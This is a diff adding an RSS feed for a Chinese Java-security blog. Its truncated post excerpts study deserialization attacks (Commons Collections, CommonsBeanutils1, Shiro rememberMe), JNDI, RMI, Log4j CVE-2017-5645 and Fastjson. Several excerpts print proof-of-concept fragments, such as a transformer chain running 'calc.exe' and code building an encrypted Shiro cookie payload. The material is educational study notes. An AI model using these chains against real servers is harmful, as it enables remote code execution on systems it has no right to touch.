@@ -1,0 +1,190 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>Java - Tag - ThnPinkman’s blog</title>
+        <link>https://thnpkm.github.io/tags/java/</link>
+        <description>Java - Tag - ThnPinkman’s blog</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 20 Aug 2024 22:54:50 &#43;0800</lastBuildDate><atom:link href="https://thnpkm.github.io/tags/java/" rel="self" type="application/rss+xml" /><item>
+    <title>java安全 类加载器与字节码</title>
+    <link>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%B8%8E%E5%AD%97%E8%8A%82%E7%A0%81/</link>
+    <pubDate>Tue, 20 Aug 2024 22:54:50 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%B8%8E%E5%AD%97%E8%8A%82%E7%A0%81/</guid>
+    <description><![CDATA[什么是java字节码 p神解释：
+严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。
+众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台的JVM虚拟机中。
+但是，本文中所说的“字节码”，可以理解的更广义一些——所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在我们的探讨范围内。
+类加载器 前面我们学习了CommonsCollections1等等cc链，这里我们学习第三条链子CommonsCollctions3，这里需要用到TemplatesImpl类，由于这个类会使用到一些类加载器中相关的知识，所以我们需要先学习一些类加载器知识
+字节码正是通过类加载器的加载，加载到JVM虚拟机中，可以在不同的平台运行，实现了跨平台特性
+ClassLoader是一个加载器，告诉JVM虚拟机如何加载Class文件，java默认的ClassLoader是根据类名来加载类的，例如：java.lang.Runtime
+URLClassLoader 远程加载 URLClassLoader是java中的一个类加载器，它支持从指定URL中加载字节码文件
+正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：
+URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件
+URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件
+URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类
+我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是非 file 协议的情况下，最常见的就是 http 协议。
+我们通过一个HTTP协议的demo来 理解一下就好了
+Test.java
+public class Test { public Test() { System.out.println(&#34;hello URLClassLoader&#34;); } } javac Test.java 编译后拿到Tset.class 文件，放入web目录下
+远程加载类
+import java.net.URL; import java.net.URLClassLoader; @SuppressWarnings(&#34;ALL&#34;) public class URLClassLoaderTest { public static void main(String[] args) throws Exception { //创建一个URL的数组 URL[] urls = new URL[]{new URL(&#34;http://localhost:8088/javatest/&#34;)}; //将其传给URLClassLoader#newInstance()方法 URLClassLoader loader = URLClassLoader.]]></description>
+</item>
+<item>
+    <title>java安全 Log4j</title>
+    <link>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-log4j/</link>
+    <pubDate>Tue, 20 Aug 2024 22:54:49 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-log4j/</guid>
+    <description><![CDATA[前言 log4j 之前有试了试利用，可能出现一些玄学当时也没复现出来。ctf题目也遇到过直接打的情况。
+学了一些java安全基础后打算再来学习一波。
+log4j有啥作用 log4j是Apache的一个开放源代码的项目，通过使用log4j，我们可以控制日志信息
+能够控制日志信息想往哪里打就往哪里打，比如：控制台、文件、邮箱、数据库等等。 能够控制日志信息想怎么打就怎么打，比如：我想要打印时间、程序的名称、程序的方法名、程序的行号、线程的名称等等。 能够控制日志信息想打什么打什么，不想打的就不打，日志信息是分级别的，有时候我只想看错误的信息或者警告的信息，有时候我想看到所有的信息我想调试程序等等。 具体可看https://cloud.tencent.com/developer/article/1455713
+Apache Log4j Server 反序列化命令执行漏洞 -CVE-2017-5645 Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。
+漏洞环境 Log4j 2.x &lt;= 2.8.1
+复现环境
+jdk1.7Log4j-api，Log4j-core 2.8.1commons-collections 3.1 pom.xml
+&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;2.8.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.8.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt; 关于java版本的更换，这次使用jenv来试试
+https://github.com/FelixSelter/JEnv-for-Windowshttps://blog.csdn.net/xhy18634297976/article/details/127454312不过idea的jdk还是需要自己更换了
+漏洞利用 import org.apache.logging.log4j.core.net.server.ObjectInputStreamLogEventBridge; import org.apache.logging.log4j.core.net.server.TcpSocketServer; import java.io.IOException; public class Log4jDemo { public static void main(String[] args) { TcpSocketServer myServer = null; try { myServer = new TcpSocketServer(4444,new ObjectInputStreamLogEventBridge()); } catch (IOException e) { throw new RuntimeException(e); } myServer.]]></description>
+</item>
+<item>
+    <title>java安全 Fastjson</title>
+    <link>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-fastjson/</link>
+    <pubDate>Tue, 20 Aug 2024 22:54:48 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-fastjson/</guid>
+    <description><![CDATA[Fastjson 什么是Fastjson？ fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。
+JavaBean是啥呢 看https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680
+在Java中，有很多class的定义都符合这样的规范：
+若干private实例字段； 通过public方法来读写实例字段。 例如：
+public class Person { private String name; private int age; public String getName() { return this.name; } public void setName(String name) { this.name = name; } public int getAge() { return this.age; } public void setAge(int age) { this.age = age; } } 如果读写方法符合以下这种命名规范：
+// 读方法: public Type getXyz() // 写方法: public void setXyz(Type value) 那么这种class被称为JavaBean
+fastjson具体有文档 https://github.com/alibaba/fastjson/wiki/Quick-Start-CN序列化与反序列化 了解一下fastjson的序列化 反序列化]]></description>
+</item>
+<item>
+    <title>java安全 JNDI注入</title>
+    <link>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-jndi%E6%B3%A8%E5%85%A5/</link>
+    <pubDate>Tue, 20 Aug 2024 22:54:47 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-jndi%E6%B3%A8%E5%85%A5/</guid>
+    <description><![CDATA[前言 学习一下jndi和jndi注入的基础
+跟着huamang哥哥的博客学
+JNDI结构 JNDI（The Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API，命名服务将名称和对象联系起来，使得我们可以用名称访问对象。
+要访问计算机中的文件，您必须提供其名称。命名服务允许您根据名称查找对象
+jndi的作用主要在于&quot;定位&quot;。比如定位rmi中注册的对象,访问ldap的目录服务等等
+有这么几个关键元素
+Name，要在命名系统中查找对象，请为其提供对象的名称 Bind，名称与对象的关联称为绑定，比如在文件系统中文件名绑定到对应的文件，在 DNS 中域名绑定到对应的 IP Context:，上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 References，在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C中的指针 这些命名/目录服务提供者:
+RMI (JAVA远程方法调用) LDAP (轻量级目录访问协议) CORBA (公共对象请求代理体系结构) DNS (域名服务) JDK里提供了5个包，以供JNDI进行功能的实现
+javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。 javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类； javax.naming.event：在命名目录服务器中请求事件通知； javax.naming.ldap：提供LDAP支持； javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。 目录中的存储对象 官网文档给出定义
+Java serializable objects Referenceable objects and JNDI References Objects with attributes (DirContext) RMI objects CORBA objects 比较常见的是 References引用对象 和 RMI远程对象
+InitialContext - 上下文 构造方法：
+//构建一个初始上下文。 InitialContext() //构造一个初始上下文，并选择不初始化它。 InitialContext(boolean lazy) //使用提供的环境构建初始上下文。 InitialContext(Hashtable&lt;?]]></description>
+</item>
+<item>
+    <title>java安全 RMI</title>
+    <link>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-rmi/</link>
+    <pubDate>Tue, 20 Aug 2024 22:54:46 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-rmi/</guid>
+    <description><![CDATA[前言 本篇主要先搞懂rmi机制，对fastjson复现有个基础
+RMI java RMI全称为 java Remote Method Invocation（java 远程方法调用），是java编程语言中，一种实现远程过程调用的应用程序编程接口。存储于java.rmi包中，使用其方法调用对象时，必须实现Remote远程接口，能够让某个java虚拟机上的对象调用另外一个Java虚拟机中的对象上的方法。两个虚拟机可以运行在相同计算机上的不同进程，也可以是网络上的不同计算机。
+他是由三层架构模式来实现的
+Client-客户端：客户端调用服务端的方法 Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果。 Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用 客户端:
+存根/桩(Stub):远程对象在客户端上的代理; 远程引用层(Remote Reference Layer):解析并执行远程引用协议; 传输层(Transport):发送调用、传递远程方法参数、接收远程方法执行结果。
+服务端:
+骨架(Skeleton):读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值; 远程引用层(Remote Reference Layer):处理远程引用后向骨架发送远程方法调用; 传输层(Transport):监听客户端的入站连接，接收并转发调用到远程引用层。
+**注册表(Registry):**以URL形式注册远程对象，并向客户端回复对远程对象的引用。
+基本流程 引用先知好文总结的图
+还是通过代码示例来学习
+Server-demo 写个服务端的demo
+⼀个RMIServer分为三部分：
+⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello() ⼀个实现了此接⼝的类 ⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了。 1.定义一个远程接口 import java.rmi.Remote; import java.rmi.RemoteException; // 定义一个远程接口，继承java.rmi.Remote接口 public interface HelloInterface extends Remote { public String hello() throws RemoteException; } 这里我们定义了一个HelloInterface接口，定义了一个hello方法，同时抛出RemoteException异常。
+这个接口需要使用public声明，否则客户端尝试加载远程接口的对象会出错（除非客户端、服务端放在一起） 继承 java.rmi.Remote接口 接口的方法需要抛出RemoteException异常 2.远程接口实现类 import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RMIServer extends UnicastRemoteObject implements HelloInterface { protected RMIServer() throws RemoteException { super(); } @Override public String hello() throws RemoteException { System.]]></description>
+</item>
+<item>
+    <title>java安全 CB1利用链分析</title>
+    <link>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</link>
+    <pubDate>Tue, 20 Aug 2024 22:54:45 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</guid>
+    <description><![CDATA[前言 在之前我们学习了java.util.PriorityQueue，它是java中的一个优先队列，队列的每个元素都有优先级，在反序列化这个对象的时候，为了保证队列顺序，会将队列中的元素进行排序，从而调用了java.io.Comparator接口的compare()方法，进而执行恶意反序列化操作
+我们能不能找到除了之前提到的TransformingComparator类以外的其他可以利用的java.util.Comparator对象？我们需要了解一下Commons Beanuitls
+Apache Commons Beanutils Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。
+javaBean就是一种标准化的java对象，成员变量为private，提供了对成员变量的getter()和setter()方法，符合驼峰命名法
+final public class Cat { private String name = &#34;catalina&#34;; public String getName() { return name; } public void setName(String name) { this.name = name; } } 在Commons Beanutils中提供了一个静态方法PropertyUtils.getProperty()
+public static Object getProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException { return PropertyUtilsBean.getInstance().getProperty(bean, name); } 让使用者可以直接调用任意JavaBean的getter方法，比如：
+PropertyUtils.getProperty(new Cat(),&#39;name&#39;) 这个方法会调用Cat对象的getName()方法，使用该方法可以调用任意对象的getter方法
+CommonsBeanUtils1 BeanComparator 我们的目的是找到其他的实现java.util.Comparator的类
+在commons-beanutils中有一个BeanComparator类：
+构造方法：
+public BeanComparator() { this((String)null); } public BeanComparator(String property) { this(property, ComparableComparator.]]></description>
+</item>
+<item>
+    <title>java安全 CC2链</title>
+    <link>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/</link>
+    <pubDate>Tue, 20 Aug 2024 22:54:44 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/</guid>
+    <description><![CDATA[前言 Apache Commons Collections是一个重要的辅助开发库。包含了⼀些Java中没有的数据结构和和辅助方法，不过随着Java 9以后的版本中原⽣库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。
+在2015年cc链被提出时，Apache Commons Collections有两个分支：
+commons-collections:commons-collections（当时版本3.2.1） org.apache.commons:commons-collections4（当时版本4.0） 官方认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产生⼤量不能 向前兼容的改动。所以，commons-collections4不再认为是⼀个用来替换commons-collections的新版 本，而是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项目中。 那么很自然有个问题，既然3.2.1中存在反序列化利用链，那么4.0版本是否存在呢？
+commons-collections4的改动 为了探索这个问题，我们需要先搞清楚⼀点，⽼的利⽤链在commons-collections4中是否仍然能使⽤？
+首先引入commons-collections4
+&lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt; copy一份CC6的poc，然后将org.apache.commons.collections都改成org.apache.commons.collections4 看看还能执行吗
+发现只有一个报错
+Map outerMap = LazyMap.decorate(innerMap, transformerChain); 这里的decorate方法没了
+我们看一下原来decorate()方法的逻辑：
+public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } 就是调用LazyMap的构造方法而已
+我们在Commons-Collections4中发现了lazyMap()方法可以用来代替
+public static &lt;K, V&gt; LazyMap&lt;K, V&gt; lazyMap(Map&lt;K, V&gt; map, Factory&lt;? extends V&gt; factory) { return new LazyMap(map, factory); } 替换一下就好了
+成功弹出计算器，说明可以在Commons-Collections4中执行cc1、cc6等链子
+CommonsCollections2 除了前面学习的几条利用链，ysoserial还提出了2条新的链子：]]></description>
+</item>
+<item>
+    <title>java安全 Shiro反序列化利用CC链</title>
+    <link>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE/</link>
+    <pubDate>Tue, 20 Aug 2024 22:54:43 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE/</guid>
+    <description><![CDATA[shiro Apache Shiro 是一个强大灵活的java开源安全框架，用于身份验证、授权和会话管理。
+为了让浏览器或服务器重启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。
+环境搭建 创建个maven项目，用p神写的shirodemo https://github.com/phith0n/JavaThings踩坑：
+启动服务过程中报错配置应用程序监听器[org.apache.shiro.web.env.EnvironmentLoaderListener]错误
+maven项目容易报这种错, 一般就是依赖没有成功引入。这个错误查了一下大概就是shiro包没有
+注意maven引入需要的shiro包
+刚开始我这里pom.xml显示找不到依赖，要去设置setting.xml https://blog.csdn.net/qq_61649579/article/details/124494237然后刷新maven ，成功引入就好
+账号：root 密码：secret
+当我们登录时勾选：Remember me 时，登录成功后，服务端成功登录后会返回rememberMe的cookie
+Shiro反序列化 为了让浏览器或服务器重 启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字 段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。
+在org.apache.shiro.mgt.AbstractRememberMeManager
+rememberMe的cookie值 –&gt; Base64解码 –&gt; AES解密 –&gt; 反序列化
+攻击过程 使用以前学过的CommonsCollections利用链生成一个序列化Payload
+使用Shiro默认Key进行加密
+将密文作为rememberMe的Cookie发送给服务端
+的shiro内置的类 org.apache.shiro.crypto.AesCipherService ，最后生成一段base64字符串。
+直接将这段字符串作为rememberMe的值（不做url编码），发送给shiro。结果并没有弹出计算器
+import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class Client0 { public static void main(String []args) throws Exception { byte[] payloads = new CommonsCollections6().getPayload(&#34;calc.exe&#34;); AesCipherService aes = new AesCipherService(); byte[] key = java.]]></description>
+</item>
+<item>
+    <title>java安全 CC3链</title>
+    <link>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc3%E9%93%BE/</link>
+    <pubDate>Tue, 20 Aug 2024 22:54:42 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc3%E9%93%BE/</guid>
+    <description><![CDATA[前言 上一篇学习了Java中加载字节码的⼀些⽅法，其中介绍了 TemplatesImpl 。
+TemplatesImpl是⼀个可以加载字节码的类，通过调⽤其 newTransformer() ⽅法，即可执⾏这段字节码的类构造器。
+那么，我们是否可以在反序列化漏洞中，利⽤这个特性来执⾏任意代码呢？
+CC1 利⽤ TemplatesImpl 执⾏字节码 cc1 demo 回看一下cc1的demo
+import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class CommonCollections1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(&#34;exec&#34;, new Class[]{String.class}, new Object[]{&#34;calc.exe&#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.]]></description>
+</item>
+<item>
+    <title>java安全 CC6链</title>
+    <link>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc6%E9%93%BE/</link>
+    <pubDate>Tue, 20 Aug 2024 22:54:41 &#43;0800</pubDate>
+    <author>Author</author>
+    <guid>https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc6%E9%93%BE/</guid>
+    <description><![CDATA[前言 上个文章CC1分析后，提到了CC1链子对应的jdk版本是8u71以前的版本，而此版本以后的jdk，Java 官方修改了sun.reflect.annotation.AnnotationInvocationHandler 的 readObject函数。
+那么高版本的readObject函数 修改如下
+private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { GetField var2 = var1.readFields(); Class var3 = (Class)var2.get(&#34;type&#34;, (Object)null); Map var4 = (Map)var2.get(&#34;memberValues&#34;, (Object)null); AnnotationType var5 = null; try { var5 = AnnotationType.getInstance(var3); } catch (IllegalArgumentException var13) { throw new InvalidObjectException(&#34;Non-annotation type in annotation serial stream&#34;); } Map var6 = var5.memberTypes(); LinkedHashMap var7 = new LinkedHashMap(); String var10; Object var11; for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.]]></description>
+</item>
+</channel>
+</rss>
